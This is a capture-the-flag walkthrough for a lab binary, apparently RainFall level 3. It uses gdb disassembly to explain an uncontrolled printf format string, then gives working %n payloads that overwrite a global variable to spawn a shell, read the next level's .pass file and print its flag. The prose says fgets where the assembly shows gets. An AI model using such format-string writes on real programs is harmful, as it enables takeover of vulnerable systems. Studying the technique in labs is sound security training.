## Level 3 — Format String Exploitation

### Vulnerability Analysis

The `level3` executable accepts input and reflects it back to the user. By analyzing the assembly code of the executable in `gdb`, we can examine the `main` and `v` functions:

```txt
(gdb) disass main
Dump of assembler code for function main:
   0x0804851a <+0>:     push   %ebp
   0x0804851b <+1>:     mov    %esp,%ebp
   0x0804851d <+3>:     and    $0xfffffff0,%esp
   0x08048520 <+6>:     call   0x80484a4 <v>
   0x08048525 <+11>:    leave  
   0x08048526 <+12>:    ret    
End of assembler dump.

```

The function `v` uses `fgets` to read `0x200` (512) bytes into a buffer, then passes that buffer directly to `printf` without a format specifier:

```assembly
   0x080484c7 <+35>:    call   0x80483c0 <gets@plt> ; Reads user input into buffer
   0x080484cc <+40>:    lea    -0x208(%ebp),%eax
   0x080484d2 <+46>:    mov    %eax,(%esp)
   0x080484d5 <+49>:    call   0x8048390 <printf@plt> ; Vulnerable: printf(buffer)

```

Because we control the string passed to `printf`, we can use format specifiers like `%x` to leak memory or `%n` to write to memory addresses.

### Goal

To trigger the `system("/bin/sh")` call, we must satisfy the condition `if (m == 64)`.
Looking at the logic following the `printf` call:

```assembly
   0x080484da <+54>:    mov    0x804988c,%eax ; Load value of global variable 'm'
   0x080484df <+59>:    cmp    $0x40,%eax     ; Compare 'm' with 0x40 (64 decimal)
   0x080484e2 <+62>:    jne    0x8048518      ; If not equal, jump to return
   ...
   0x08048513 <+111>:   call   0x80483c0 <system@plt> ; If equal, spawn shell

```

* **Target Address (`m`)**: `0x0804988c`
* **Required Value**: `64` (0x40)

### Exploitation Steps

#### 1. Find the Parameter Offset

First, we need to determine where our input string is located on the stack relative to the `printf` call. We use a unique header followed by several `%08x` specifiers to leak stack values.

```txt
(gdb) run <<< $(python2 -c "print '\x8c\x98\x04\x08' + '-%08x' * 4")
Starting program: /home/user/level3/level3 <<< $(python2 -c "print '\x8c\x98\x04\x08' + '-%08x' * 4")
-00000200-b7fd1ac0-b7ff37d0-0804988c

```

The 4th parameter printed is `0804988c`, which is the exact address we placed at the start of our string. This confirms our input starts at the **4th position** on the stack.

#### 2. Craft the Payload

We need `printf` to output exactly 64 characters before reaching the `%n` specifier, which will write that count to our target address.

* **Target Address (4 bytes)**: `\x8c\x98\x04\x08`
* **Leaking first 3 parameters**: We use `-%08x-` three times.
* **Calculation**:
* Initial address: 4 bytes
* Three `%08x` blocks ($3 \times 8$): 24 bytes
* Six separators (`-`): 6 bytes
* **Current count**: $4 + 24 + 6 = 34$ characters.


* **Required Padding**: To reach 64, we need $64 - 34 = 30$ additional characters.

#### 3. The Final Exploit

Combining the address, the stack "walk," and 30 bytes of padding:

```bash
(python2 -c "print '\x8c\x98\x04\x08' + '-%08x-'*3 + 'a'*30 + '%n'"; cat) | ./level3

```

*Note: Alternatively, we can use the Direct Parameter Access (`%4$n`) to simplify the payload. Since the address is 4 bytes, we need 60 more characters to reach 64:*

```bash
(python2 -c "print '\x8c\x98\x04\x08' + '%60d' + '%4$n'"; cat) | ./level3

```

### Flag Extraction

Once the value at `0x0804988c` is overwritten to 64, the program enters the restricted block:

```bash
level3@RainFall:~$ (python2 -c "print '\x8c\x98\x04\x08' + '-%08x-'*3 + 'a'*30 + '%n'"; cat) | ./level3
-00000200--b7fd1ac0--b7ff37d0-aaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
Wait what?!
whoami
level4
cat /home/user/level4/.pass
b209ea91ad69ef36f2cf0fcbbc24c739fd10464cf545b20bea8572ebdc3c36fa

```